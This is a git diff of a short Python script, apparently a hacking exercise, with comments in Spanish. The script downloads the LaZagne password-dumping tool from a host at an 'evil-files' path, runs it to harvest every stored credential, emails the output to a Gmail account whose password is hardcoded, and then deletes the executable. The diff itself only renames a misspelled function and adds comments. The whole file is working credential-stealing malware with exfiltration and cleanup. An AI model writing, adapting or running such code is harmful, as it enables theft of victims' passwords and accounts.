@@ -2,7 +2,7 @@
 
 import requests, subprocess, smtplib, os, tempfile
 
-def downlaod(url):
+def download(url):
     get_response = requests.get(url)
     file_name = url.split("/")[-1]
     with open(file_name, "wb") as out_file:
@@ -19,9 +19,11 @@ def send_mail(email, password, message):
 
 temp_directory = tempfile.gettempdir()
 os.chdir(temp_directory)
-downlaod("http://192.168.29.128/evil-files/laZagne_x64.exe")
+
+#Luego bajamos el archivo deseado
+download("http://192.168.29.128/evil-files/laZagne_x64.exe")
+#Ejecutamos
 result = subprocess.check_output("laZagne_x64.exe all", shell=True)
 send_mail("aet3rnum2020@gmail.com", "pYo7HfcnMc", result)
+#Borramos el archivo
 os.remove("laZagne_x64.exe")
-
-#Test Commit
